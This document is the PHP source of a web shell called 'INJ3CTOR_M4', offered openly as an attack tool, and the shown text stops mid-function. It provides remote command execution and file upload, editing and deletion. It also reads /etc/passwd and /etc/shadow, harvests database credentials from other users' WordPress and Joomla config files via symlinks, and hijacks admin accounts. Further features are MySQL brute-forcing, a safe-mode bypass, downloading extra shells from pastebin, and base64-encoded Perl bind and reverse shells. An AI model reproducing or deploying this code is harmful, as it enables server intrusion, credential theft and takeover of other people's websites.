<?php
$pass = 'a760880003e7ddedfef56acb3b09697f'; // Change it if you want. Type:md5
if(isset($_COOKIE["pass"]) != $pass){
	if( @md5($_POST['passwrd']) == $pass){
		print '<script>document.cookie="pass='.md5($_POST['passwrd']).';";</script>';
	}else{
		echo'<form method="POST"><input name="passwrd" type="password" onfocus="if (this.value == \'PassWord\') this.value = \'\';" /><input type="submit" value=">" /></form>';
		exit;
	}
}
?>
<style>
body{
	background-color: #e6e6e6;
}
input,select,textarea{
	border:1px solid #4F4F4F; font-family:Verdana; font-size:11px;
}
</style>
<link rel="shortcut icon" href='http://files.softicons.com/download/internet-cons/world-flags-orbs-icons-by-vathanx/png/256/Flag%20of%20Morocco.png' />
<center>
<table border="1" cellpadding='5' style='width: 100%; max-width: 800px; table-layout: fixed;'>
<tr><td align='center'><big><i>C4T H4CK3R ~ INJ3CTOR_M4</i></big></td></tr>
<?php
#INJ3CTOR_M4 WEB-SHELL
#MOROCCAN HAXORZ
@set_time_limit(0);
@error_reporting(0);
echo"<title>$_SERVER[HTTP_HOST] ~ Made In Morocco</title>";

echo'<tr><td align="center"><b><font size="2" face="Courier">Your IP:'.$_SERVER["REMOTE_ADDR"].' || The Server iP:<a href="http://www.bing.com/search?q=ip%3A'.gethostbyname($_SERVER["HTTP_HOST"]).'" target="_blank">'.gethostbyname($_SERVER["HTTP_HOST"]).'</a></font></b></tr></td>';
echo"<tr><td align='center'><b><font size='2' face='Courier'>ID=".getmyuid()."(".get_current_user().") - UID=".getmyuid()."(".get_current_user().") - GID=".getmygid()."(".get_current_user().")</font></b></td></tr>";
echo'<tr><td align="center"><b><font size="2" face="Courier">[HOME] cwd: <u>'.getcwd().'</u></font></b></td></tr>';
echo'<tr><td align="center"><b><font size="2" face="Courier">[ <a href="'.basename(__FILE__).'" >./HOME</a>] || [ <a href="?info" >./SEC.INFO</a> ] || [ <a href="?files&cwd='.getcwd().'" >./FILES</a> ] || [ <a href="?exec&cwd='.getcwd().'" >./EXEC</a> ] || [ <a href="?bypass&cwd='.getcwd().'" >./BYPASS</a> ] || [ <a href="?mysql" >./MYSQL_TOOLZ</a> ] || [ <a href="?network" >./NETWORK_TOOLZ</a> ] || [ <a href="?defacer&cwd='.getcwd().'" >./DEFACER</a> ] || [ <a href="?brute" >./BRUTEFORCER</a> ]</font></b></td></tr>';

if(isset($_REQUEST['cwd'])){
		$cwd = trim($_REQUEST['cwd']);
		chdir($cwd);
}

if(isset($_GET['info'])){
	echo'<tr><td align="center"><font size="2" face="Courier">uname -a: <a href="http://www.exploit-db.com/search/?action=search&filter_exploit_text='.php_uname("r").'"target="_blank"><u>'.php_uname().'</u></font></a>';
	echo'<br /><br /><font size="2" face="Courier">Software : <u>'.getenv("SERVER_SOFTWARE").'</u></font>';
	echo'<br /><br /><font size="2" face="Courier">PHP Version: <u>'.@phpversion().'</u></font></td></tr>';
	if( @ini_get("safe_mode") or strtolower( @ini_get("safe_mode")) == "on"){
		echo'<tr><td align="center"><font size="2" face="Courier">Safe Mode: <b><u><font color="red">ON (Secure)</u></b></font>';
	}else{
		echo'<tr><td align="center"><font size="2" face="Courier">Safe Mode: <b><u><font color="green">OFF (Not Secure)</u></b></font>';
	}
	echo' || Open_BaseDir: <u>'.server_info("openbase_dir").'</u></font>';
	echo'<br /><br /><font size="2" face="Courier">Disabled Functions: <u>'.server_info("showdisablefunctions").'</u></font></b></td></tr>';
	echo'<tr><td align="center"><font size="2" face="Courier">shadow File is: <u>'.server_info("shadow").'</u> || named.conf File is: <u>'.server_info("named_conf").'</u> || passwd File is: <u>'.server_info("passwd").'</u></font></td></tr>';
	echo'<tr><td align="center"><font size="2" face="Courier">Perl: <u>'.server_info("testperl").'</u> || Python: <u>'.server_info("testpy").'</u> || Wget: <u>'.server_info('testwget').'</u></font></td></tr>';
}elseif(isset($_GET['files'])){
	echo'<tr><td align="left">';
	echo'<b><font size="2" face="Courier">Current Path : '.getcwd().'</font></b>';
	echo'<br /><form method="GET"><b><font size="2" face="Courier"><font color="red">Or</font> Select Your Path : </font></b><input type="hidden" name="files"><input type="text" name="cwd" value="'.getcwd().'" /><input type="submit" value=">>" /></form>';
	echo'<form method="POST" enctype="multipart/form-data"><b><font size="2" face="Courier">Upload File : </font></b><input name="fil3" type="file" /> <input name="path" type="text" value="'.getcwd().'" /> <input type="submit" value="Upload" /></form>';
	if(isset($_FILES['fil3']) && isset($_POST['path'])){
		if(move_uploaded_file($_FILES['fil3']['tmp_name'],$_POST['path'].'/'.$_FILES['fil3']['name'])){
			echo'<font color="green" size="2" face="Courier">File Upload Done.</font><br /><br />';
		}else{
			echo'<font color="red" size="2" face="Courier">File Upload Error.</font><br /><br />';
		}
	}
	echo'<form method="POST"><select name="cr_opt"><option value="makedir">Dir</option><option value="makefile">File</option></select><input type="text" name="name" /><input type="submit" value="Creat" /></form>';
	if(isset($_POST['name'])){
		switch($_POST['cr_opt']){
			case 'makedir':
				$dir_1 = trim($_POST['name']);
				if(!file_exists($dir_1) && !is_dir($dir_1)){
					if(mkdir($dir_1)){
						echo'<font color="green" size="2" face="Courier">'.$dir_1.' Created!</font><br /><br />';
					}else{
						echo'<font color="red" size="2" face="Courier">Can\'t Creat '.$dir_1.'</font><br /><br />';
					}
				}else{
					echo'<font color="red" size="2" face="Courier">'.$dir_1.' Already Exists!</font><br /><br />';
				}
				break;
			case 'makefile':
				$file=trim($_POST['name']);
				$f=fopen($file, 'w');
				if($f){
					if(isset($_POST['update'])){
						$data=$_POST['update'];
						$w=fwrite($f, $data);
						if($w){
							echo'<font color="green" size="2" face="Courier">'.$file.' Created!</font><br /><br />';
						}else{
							echo'<font color="red" size="2" face="Courier">Can\'t Creat '.$file.'</font><br /><br />';
						}
					}else{
						echo'<form method="POST">';
						echo'<textarea name="update" cols="50" rows="15"></textarea>';
						echo'<br /><input type="submit" value=">>" /><input type="hidden" name="cwd" value="'.$_GET['cwd'].'" /><input type="hidden" name="cr_opt" value="makefile" /><input type="hidden" name="name" value="'.$_POST['name'].'" /></form>';
					}
				}else{
					echo'<font color="red" size="2" face="Courier">Can\'t Creat '.$file.'</font><br /><br />';
				}
				break;
		}
	}
	if($handle = opendir($_REQUEST['cwd'])){
		while(($file = readdir($handle))!= false){
			if(is_dir($file)){
				$directories[] = $file;
			}else{
				$files[] = $file;
			}
		}
		asort($directories);
		asort($files);
		echo'<table border="1" style="width: 100%; max-width: 800px; table-layout: fixed; font-size: 14px;"><td align="center" style="width: 200px; font-size: 12px; font-family: verdana;"><b>Filename</b></td><td align="center" style="width: 65px; font-size: 12px; font-family: verdana;"><b>Owner/Group</b></td><td align="center" style="width: 60px; font-size: 12px; font-family: verdana;"><b>Permissions</b></td><td align="center" style="width: 110px; font-size: 12px; font-family: verdana;"><b>Action</b></td><tr>';
		foreach($directories as $dir){
			if(fileowner($dir)){$owner_d = fileowner($dir);}else{$owner_d = "NONE";}
			if(filegroup($dir)){$group_d = filegroup($dir);}else{$group_d = "NONE";}
			echo"<td><b><font size='2' face='Courier'><a href='?files&cwd=".getcwd()."/$dir'>[ $dir ]</a></td><td align='center'>$owner_d/$group_d</td><td align='center'><font color='".get_color($dir)."'>[".perm($dir)."]</font></font></b></td><td><form method='POST'><input type='hidden' name='file' value='".$dir."' /><select name='opt'><option value='delete'>Delete</option></select><input type='submit' value='>>' /> <a href='?action=rename&file=".$dir."&cwd=".getcwd()."' target='_blank'>[R]</a></form></td><tr>";
		}
		foreach($files as $fil){
			if(fileowner($fil)){$owner_f = fileowner($fil);}else{$owner_f = "NONE";}
			if(filegroup($fil)){$group_f = filegroup($fil);}else{$group_f = "NONE";}
			echo"<td><b><font size='2' face='Courier' color='grey'>$fil</td><td align='center'>$owner_f/$group_f</td><td align='center'><font color='".get_color($fil)."'>[".perm($fil)."]</font></font></b></td><td><form method='POST'><input type='hidden' name='file' value='".$fil."' /><select name='opt'><option value='delete'>Delete</option><option value='download'>Download</option></select><input type='submit' value='>>' /> <a href='?action=edit&file=".$fil."&cwd=".getcwd()."' target='_blank'>[E]</a> <a href='?action=rename&file=".$fil."&cwd=".getcwd()."' target='_blank'>[R]</a> <a href='?action=chmod&file=".$fil."&cwd=".getcwd()."' target='_blank'>[C]</a></form></td><tr>";
		}
	}else{
		echo"<br /><u><font size='2' face='Courier'>Error!</u> Can't open <b>".$_REQUEST['cwd']."</b>!</font><br />";
	}
	if(isset($_POST['file'])){
		$file = trim($_POST['file']);
		switch($_POST['opt']){
			case 'delete':
				if(!is_dir($file)){
					if(unlink($file) or delete($file)){
						echo'<center><b><font color="green" size="2" face="Courier">The File '.$file.' Deleted!</font></b></center>';
					}else{
						echo'<center><b><font color="red" size="2" face="Courier">Can\'t Delete The File: '.$file.'</font></b><br /></center>';
					}
				}else{
					if(!empty($file)){
						array_map('unlink', glob("$file/*.*"));
						if(rmdir($file)){
							echo'<center><b><font color="green" size="2" face="Courier">The Dir '.$file.' Deleted!</font></b><br /></center>';
						}else{
							echo'<center><b><font color="red" size="2" face="Courier">Can\'t Delete The Dir: '.$file.'</font></b><br /></center>';
						}
					}else{
						if(rmdir($file)){
							echo'<center><b><font color="green" size="2" face="Courier">The Dir '.$file.' Deleted!</font></b><br /></center>';
						}
					}
				}
				break;
			case 'download':
				header('Content-type: text/plain');
				header('Content-Disposition: attachment; filename="'.$file.'"');
				echo(file_get_contents($file));
				exit();
				break;
		}
	}
	echo'</table>';
}elseif(isset($_GET['action'])){
	echo'<tr><td align="center">';
	if($_GET['action'] == 'rename'){
		echo'<br /><form method="POST"><input type="text" value="'.$_GET['file'].'" /><input type="text" name="new" placeholder="New" /><input type="submit" value=">>" /></form>';
		$file = $_GET['file'];
		if(!empty($_POST['new'])){
			$new = trim($_POST['new']);
			if(rename($file, $new)){
				echo'<font color="green" size="2" face="Courier">DONE!</font><br /><br />';
				echo'<script type="text/javascript">setTimeout("window.close();", 500);</script>';
			}else{
				echo'<font color="red" size="2" face="Courier">ERROR!</font><br /><br />';
			}
		}
	}elseif($_GET['action'] == 'chmod'){
		echo'<br /><form method="POST"><input type="text" value="'.$_GET['file'].'" /><input type="text" name="new" placeholder="New" /><input type="submit" value=">>" /></form>';
		$file = $_GET['file'];
		if(!empty($_POST['new'])){
			$new = trim($_POST['new']);
			if(chmod($file, $new)){
				echo'<font color="green" size="2" face="Courier">DONE!</font><br /><br />';
				echo'<script type="text/javascript">setTimeout("window.close();", 500);</script>';
			}else{
				echo'<font color="red" size="2" face="Courier">ERROR!</font><br /><br />';
			}
		}
	}elseif($_GET['action'] == 'edit'){
		$file = $_GET['file'];
		$src = htmlspecialchars(file_get_contents($file));
		echo'<br /><b><font size="2" face="Courier">'.$file.'</font></b><br />';
		$f = fopen($file, 'w') or die('<b><font color="green" size="2" face="Courier"> can\'t Open The File</font></b>');
		if(isset($_POST['update'])){
			$data = $_POST['update'];
			$w = fwrite($f, $data);
			if($w){
				echo'<center><b><font color="green" size="2" face="Courier">'.$file.' Edited!</font></b><br /></center>';
				echo'<script type="text/javascript">setTimeout("window.close();", 500);</script>';
			}else{
				echo'<center><b><font color="red" size="2" face="Courier">Can\'t Edit '.$file.'</font></b><br /></center>';
			}
		}else{
			echo'<form method="POST">';
			echo'<textarea name="update" cols="84" rows="25">'.$src.'</textarea>';
			echo'<br /><input type="submit" value="Go" /></form>';
		}
	}
}elseif(isset($_GET['exec'])){
	echo'<tr><td align="center">';
	echo'<br /><form method="POST"><input size="100" name="cmd" /><input value="Exec Command" type="submit" /></form>';
	if(isset($_POST['cmd'])){
		$cmd = trim($_POST['cmd']);
		echo'<textarea rows="20" cols="100">';
		echo wsoEx($cmd);
		echo'</textarea><br /><br />';
	}
	echo'</tr></td>';
}elseif(isset($_GET['bypass'])){
	echo'<tr><td align="center">';
	echo'<br /><u><font size="2" face="Courier">ADDONS & TOOLZ:</font></u><br />';
	echo'<br /><form method="POST"><input type="submit" value="CGI-PERL" name="cgi-perl" /> <input type="submit" value="KILL-SAFEMODE" name="safemode-killer" /> <input type="submit" value="USERS & DOMAINS" name="dom_user" /></form>';
	if(isset($_POST['cgi-perl'])){
		echo creat_cgi('shell');
	}if(isset($_POST['safemode-killer'])){
		safemodekiller();
	}
	if(isset($_POST['dom_user'])){
		echo creat_cgi('users');
	}
	echo'<u><font size="2" face="Courier">READ FILE:</font></u><br />';
	echo'<br /><form method="POST"><input type="text" name="file" size="22" value="/etc/passwd" /><input type="submit" value="READ FILES" /></form>';
	if(isset($_POST['file'])){
		$file = trim($_POST['file']);
		echo"<textarea rows=30 cols=125>";
		readfils($file);
		echo"</textarea><br /><br />";
	}
	echo'<u><font size="2" face="Courier">SYMLINK & COPY:</font></u><br />';
	echo'<br /><form method="post"><input type="text" name="path" placeholder="/home/user/public_html/config.php" size="50"/><input type="text" name="output" placeholder="output.txt" size="10"/><input type="submit" value="Bypass" /></form>';
	if(isset($_POST['path']) && isset($_POST['output'])){
		$path = trim($_POST['path']);
		$output = trim($_POST['output']);
		Sym($path, $output);
	}
	echo'</tr></td>';
}elseif(isset($_GET['mysql'])){
	echo'<tr><td align="center">';
	echo'<u><font size="2" face="Courier">MYSQL CMDER:</font></u><br />';
	echo'<br /><form method="POST" /><input type="text" name="host" value="localhost"> <input type="text" name="user" placeholder="username"> <input type="text" name="pass" placeholder="password"> <input type="text" name="db" placeholder="database"><br /><br /><font size="2" face="Courier">cmnd: </font><textarea cols=30 rows=4 name="sql"></textarea><br /><input type="submit" value="SQL" /></form>';
	if(isset($_POST['host']) && isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['db']) && isset($_POST['sql'])){
		$h = trim($_POST['host']);
		$u = trim($_POST['user']);
		$p = trim($_POST['pass']);
		$d = trim($_POST['db']);
		$c = trim($_POST['sql']);
		
		$con = mysql_connect($h,$u,$p);
		if (!$con){
			die("Could not connect: " . mysql_error());
		}
		$db_selected = mysql_select_db($d, $con);
		if (!$db_selected){
			die ("Can't use ".$d." : " . mysql_error());
		}
		$q = mysql_query($c);
		if ($q){
			echo 'Done !!<br /><br />';
			echo '<textarea rows="5" cols="50">';
			while ($row = mysql_fetch_assoc($q)){
				print_r ($row)."\n";	
			}
			echo '</textarea><br /><br />';
		}else{
			echo 'Error !!<br /><br />';
		}
		mysql_close($con);
	}
	echo'<u><font size="2" face="Courier">JOOMLA & WORDPRESS INFO CHANGER:</font></u><br />';
	echo'<br /><form method="POST"><input type="text" name="host_1" value="localhost"> <input type="text" name="user_1" placeholder="username"> <input type="text" name="pass_1" placeholder="password"> <input type="text" name="prefix_1" placeholder="db_prefix"> <input type="text" name="db_1" placeholder="database"><select name="scrpt"><option value="wordpress">wordpress</option><option value="joomla">joomla</option></select> <input type="submit" value="START" /></form>';
	if(isset($_POST['host_1']) && isset($_POST['user_1']) && isset($_POST['pass_1']) && isset($_POST['prefix_1']) && isset($_POST['db_1'])){
		$h = trim($_POST['host_1']);
		$u = trim($_POST['user_1']);
		$p = trim($_POST['pass_1']);
		$d = trim($_POST['db_1']);
		$x = trim($_POST['prefix_1']);
		$con = mysql_connect($h,$u,$p);
		if(!$con){
			die("Could not connect: " . mysql_error());
		}
		$db_selected = mysql_select_db($d, $con);
		if(!$db_selected){
			die ("Can't use ".$d." : " . mysql_error());
		}
		switch($_POST['scrpt']){
			case 'wordpress':
				$q = mysql_query("UPDATE `".$x."users` SET `user_login` ='inj3ctor_m4' WHERE ID = 1");
				$q = mysql_query("UPDATE `".$x."users` SET `user_pass` ='fd6b6fc9220b72d21683ae8e4f50a210' WHERE ID = 1");
				if($q){
					echo '<font siz="2" face="Courier" color=green>(New User: inj3ctor_m4, New Password: m4)</font><br /><br />';
				}else{
					echo '<font siz="2" face="Courier" color=red>ERROR !!</font></font><br /><br />';
				}
				break;
			case 'joomla':
				$q = mysql_query("UPDATE `".$x."users` SET `password` ='fd6b6fc9220b72d21683ae8e4f50a210' , `username` ='inj3ctor_m4' WHERE `usertype` ='Super Administrator' LIMIT 1;");
				$q = mysql_query("UPDATE `".$x."users` SET `password` ='fd6b6fc9220b72d21683ae8e4f50a210' , `username` ='inj3ctor_m4' WHERE `username` ='admin' LIMIT 1;");
				if($q){
					echo '<font siz="2" face="Courier" color=green>(New User: inj3ctor_m4, New Password: m4)</font><br /><br />';
				}else{
					echo '<font siz="2" face="Courier" color=red>ERROR !!</font><br /><br />';
				}
				break;
		}
	}			
	echo'</tr></td>';
// By WSO-TEAM
}elseif(isset($_GET['network'])){
	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	echo'<tr><td align="center">';
	echo'<u><font size="2" face="Courier">BIND-CONNECT:</font></u><br />';
	echo'<br /><form method="POST"><input type="text" name="port" value="31337" /><input type="submit" value="BIND CONNECT" /></form>';
	if(isset($_POST['port'])){
		GenerateFile('/tmp/bp.pl', base64_decode($bind_port_p));
		$out = wsoEx("perl /tmp/bp.pl ".$_POST['port']." 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre class=ml1>$out\n".nl2br(wsoEx("ps aux | grep bp.pl"))."</pre>";
		unlink("/tmp/bp.pl");
	}
	echo'<u><font size="2" face="Courier">BACK-CONNECT:</font></u><br />';
	echo'<br /><form method="POST"><input type=text name="ip" value='.$_SERVER["REMOTE_ADDR"].' /><input type=text name="p0rt" value=443 /><input type=submit value="BACK CONNECT" /></form>';
	if(isset($_POST['ip']) && isset($_POST['p0rt'])){
		GenerateFile('/tmp/bp.pl', base64_decode($back_connect_p));
		$out = wsoEx("perl /tmp/bc.pl ".$_POST['ip']." ".$_POST['p0rt']." 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre class=ml1>$out\n".nl2br(wsoEx("ps aux | grep bc.pl"))."</pre>";
		unlink("/tmp/bc.pl");
	}
	echo'</tr></td>';
}elseif(isset($_GET['defacer'])){
	echo'<tr><td align="center">';
	if(isset($_POST['users'])){
		$r = "Options all \nDirectoryIndex Sux.html\nAddType text/plain .php\nAddHandler server-parsed .php\nAddType text/plain .html\nAddHandler txt .html\nRequire None\nSatisfy Any";
		@mkdir('m4_configs', 0755);
		@chdir('./m4_configs');
		GenerateFile('.htaccess', $r);
		$passwd = explode("\n", $_POST['users']);
		$configs_path = array(	'wp-config.php', 'wp/wp-config.php', 'WP/wp-config.php', 'wp/beta/wp-config.php',
								'beta/wp-config.php', 'press/wp-config.php', 'wordpress/wp-config.php',
								'wordpress/beta/wp-config.php', 'news/wp-config.php', 'new/wp-config.php',
								'blog/wp-config.php', 'beta/wp-config.php', 'blogs/wp-config.php', 'home/wp-config.php',
								'protal/wp-config.php', 'site/wp-config.php', 'main/wp-config.php',
								'test/wp-config.php', 'joo/configuration.php', 'cms/configuration.php',
								'site/configuration.php', 'main/configuration.php', 'news/configuration.php',
								'new/configuration.php' ,'home/configuration.php', 'configuration.php');
		foreach($passwd as $users){
			$users = explode(':', $users);
			$user = $users[0];
			$funs = array('symlink', 'copy');
			foreach($funs as $f){
				if(function_exists($f)){
					foreach($configs_path as $config_path){
						@$f("/home/$user/public_html/$config_path", "$user-m4.txt");
					}
					break;
				}
			}
		}
		$url = get_configs_path();
		$data = get_source($url);
		preg_match_all('#href="(.*?)">#', $data, $matches);
		$configs = array_unique($matches[1]);
		foreach($configs as $config){
			$user = explode('-', $config);
			$data = get_source($url.$config);
			if(preg_match("#'DB_HOST', '(.*?)'#i", $data)){
				echo'<font size="2" face="Courier"> The Url [WORDPRESS] : <a href="http://'.gethostbyname($_SERVER["HTTP_HOST"]).'/~'.$user[0].'" target="_blank">http://'.gethostbyname($_SERVER["HTTP_HOST"]).'/~'.$user[0].'</a>';
				preg_match("#'DB_HOST', '(.*?)'#i", $data, $DB_HOST);
				preg_match("#'DB_USER', '(.*?)'#i", $data, $DB_USER);
				preg_match("#'DB_PASSWORD', '(.*?)'#i", $data, $DB_PASSWORD);
				preg_match("#table_prefix  = '(.*?)#i';", $data, $DB_PREFIX);
				preg_match("#'DB_NAME', '(.*?)'#i", $data, $DB_NAME);
				$con = @mysql_connect($DB_HOST[1],$DB_USER[1],$DB_PASSWORD[1]);
				if($con){
					$db_selected = @mysql_select_db($DB_NAME[1], $con);
					if($db_selected){
						$q = @mysql_query("UPDATE `".$DB_PREFIX[1]."users` SET `user_login` ='inj3ctor_m4' WHERE ID = 1");
						$q = @mysql_query("UPDATE `".$DB_PREFIX[1]."users` SET `user_pass` ='fd6b6fc9220b72d21683ae8e4f50a210' WHERE ID = 1");
						if($q){
							echo' <font color=green>(New User: inj3ctor_m4, New Password: m4)</font></font><br />';
						}else{
							echo' <font color=red>(ERROR)</font></font><br />';
						}
					}else{
						echo' <font color=red>(Can\'t Select The Database)</font></font><br />';
					}
				}else{
					echo' <font color=red>(Could not connect)</font></font><br />';
				}
			}elseif(preg_match('/JConfig/', $data)){
				echo'<font size="2" face="Courier"> The Url [JOOMLA] : <a href="http://'.gethostbyname($_SERVER["HTTP_HOST"]).'/~'.$user[0].'" target="_blank">http://'.gethostbyname($_SERVER["HTTP_HOST"]).'/~'.$user[0].'</a>';
				$data = get_source($url.$config);
				preg_match("#host = '(.*?)'#i", $data, $DB_HOST);
				preg_match("#user = '(.*?)'#i", $data, $DB_USER);
				preg_match("#password = '(.*?)'#i", $data, $DB_PASSWORD);
				preg_match("#dbprefix = '(.*)'#i", $data, $DB_PREFIX);
				preg_match("#db = '(.*?)'#i", $data, $DB_NAME);
				$con = @mysql_connect($DB_HOST[1],$DB_USER[1],$DB_PASSWORD[1]);
				if($con){
					$db_selected = @mysql_select_db($DB_NAME[1], $con);
					if($db_selected){
						$q = mysql_query("UPDATE `".$DB_PREFIX[1]."users` SET `password` ='fd6b6fc9220b72d21683ae8e4f50a210' , `username` ='inj3ctor_m4' WHERE `usertype` ='Super Administrator' LIMIT 1;");
						$q = mysql_query("UPDATE `".$DB_PREFIX[1]."users` SET `password` ='fd6b6fc9220b72d21683ae8e4f50a210' , `username` ='inj3ctor_m4' WHERE `username` ='admin' LIMIT 1;");
						if($q){
							echo' <font color=green>(New User: inj3ctor_m4, New Password: m4)</font></font><br />';
						}else{
							echo' <font color=red>(ERROR)</font></font><br />';
						}
					}else{
						echo' <font color=red>(Can\'t Select The Database)</font></font><br />';
					}
				}else{
					echo' <font color=red>(Could not connect)</font></font><br />';
				}
			}
		}
	}else{
		echo'<form method="POST"><font size="2" face="Courier">Usernames :</font><textarea cols=75 rows=25 name="users"></textarea><br /><input type="submit" value="GO" /><br />';
	}
	echo'</tr></td>';
}elseif(isset($_GET['brute'])){
	echo'<tr><td align="left">';
	if(isset($_POST['usernames']) && isset($_POST['passwords'])){
		$usernames = explode("\n", $_POST['usernames']);
		$passwords = explode("\n", $_POST['passwords']);
		foreach($usernames as $username){
			foreach($passwords as $password){
				$username = trim($username);
				$password = trim($password);
				$co = @mysql_connect('localhost',$username,$password);
				if($co){
					mysql_close($co);
					echo "<br /><font size='2' face='Courier'>Team R00T~ Username (<font color=red>$username</font>) Password (<font color=red>$password</font>)<br />";
				}
			}
		}
	}else{
		echo'<b><font size="2" face="Courier">Usernames :</font></b><br />';
		echo'<textarea cols=84 rows=10 name="usernames"></textarea><br />';
		echo'<b><font size="2" face="Courier">Passwords :</font></b><br />';
		echo'<textarea cols=84 rows=10 name="passwords"></textarea><br />';
		echo'<form method="POST" /><input type="submit" value="Crack"></form>';
	}
	echo'</tr></td>';
}
echo'<tr><td align="center"><font size="6" color="#051F53">MOROCCAN HAXORZ</font></tr></td>';

function server_info($opt){
	if($opt == "named_conf"){
		if( @is_readable('/etc/named.conf')){
			return "<font color=green><b>Readable</b></font>";
		}else{ return "<font color=red><b>Not Readable</b></font>"; }
	}elseif($opt == "passwd"){
		if( @is_readable('/etc/passwd')){
			return "<font color=green><b>Readable</b></font>";
		}else{ return "<font color=red><b>Not Readable</b></font>"; }
	}elseif($opt == "shadow"){
		if( @is_readable('/etc/shadow')){
			return "<font color=green><b>Readable</b></font>";
		}else{ return "<font color=red><b>Not Readable</b></font>"; }
	}elseif($opt == "showdisablefunctions"){
		if($disablefunc = @ini_get("disable_functions")){
			return "<font color=red><b>".$disablefunc."</b></font>";
		}else{ return "<font color=green><b>NONE</b></b></font>"; }
	}elseif($opt == "openbase_dir"){
		if($openbase_dir = @ini_get('open_basedir')){
			return "<font color=red><b>".$openbase_dir."</b></font>";
		}else{ return "<font color=green><b>NONE</b></b></font>"; }
	}elseif($opt == "testperl"){
		if( @wsoEx('perl -v')){ 
			return "<font color=green><b>ON</b></font>";
		}else{ return "<font color=red><b>OFF</b></font>"; }
	}elseif($opt == "testpy"){
		if ( @wsoEx('python -v')){
			return "<font color=green><b>ON</b></font>";
		}else{
			return "<font color=red><b>OFF</b></font>"; }
	}elseif($opt == "testwget"){
		if( @wsoEx('wget --help')){
			return "<font color=green><b>ON</b></font>";
		}else{
			return "<font color=red><b>OFF</b></font>"; }
	}
}

function perm($file){
	if(file_exists($file)){
		return substr(sprintf('%o', fileperms($file)), -4);
	}else{	return "????";	}
}

function get_color($file){
	if(is_writable($file)){ return "green";}
	if(!is_writable($file) && is_readable($file)){ return "white";}
	if(!is_writable($file) && !is_readable($file)){ return "red";}
 }

function GenerateFile($name,$content){
	if(function_exists('fopen') && function_exists('fclose')) {
		$f = fopen($name,"w+");
		if($f){
			if(function_exists('fwrite')){$w = fwrite($f,$content); }	
			elseif(function_exists('fputs')){$w = fputs($f,$content); }
			elseif(function_exists('file_put_contents')){$w = file_put_contents($f,$content);}
			if(!$w){return false;}
		}
		else{return false;}fclose($f);return true;
	}
}

function creat_cgi($opt){
	$ht = "Options FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .m4\nAddHandler cgi-script .m4";
	@mkdir('cgi-perl', 0755);
	@chdir('./cgi-perl');
	if(GenerateFile('.htaccess', $ht)){
		if($opt == 'shell'){
			if(GenerateFile('cgi.m4', get_source('http://pastebin.com/raw.php?i=CacKw9nQ'))){
				chmod('cgi.m4', 0755);
				return "<font size='2' face='Courier'><a href='cgi-perl/cgi.m4' target='_blank'>./CGI SHELL</a><br />Password = priv8<br /></font><br />";
			}else{
				return "<br><font size='2' face='Courier'>Something Happened, Creat CGI SHELL Failed!</font><br /><br />";
			}
		}elseif($opt == 'users'){
			if(GenerateFile('users.m4', get_source('http://pastebin.com/raw.php?i=RyMCwVKR'))){
				chmod('users.m4', 0755);
				return "<font size='2' face='Courier'><a href='dom_users/users.m4' target='_blank'>./USERS & DOMAINS</a></font><br /><br />";
			}else{	return "<br><font size='2' face='Courier'>Something Happened, Failed!</font><br /><br />";	}
		}
	}else{	return "<br><font size='2' face='Courier'>Something Happened, Failed!</font><br /><br />";	}
}

function safemodekiller(){
	if(GenerateFile('php.ini', "safe_mode = Off\ndisable_functions = NONE\nsafe_mode_gid = OFF\nopen_basedir = OFF")){
		echo"<font size='2' face='Courier'>[+]<a href='php.ini' target='_blank'>php.ini</a> Has Been Generated Successfull</font><br />";
	}else{
		echo"<font size='2' face='Courier'>Something Happened, Creat php.ini Failed!</font><br />";
	}
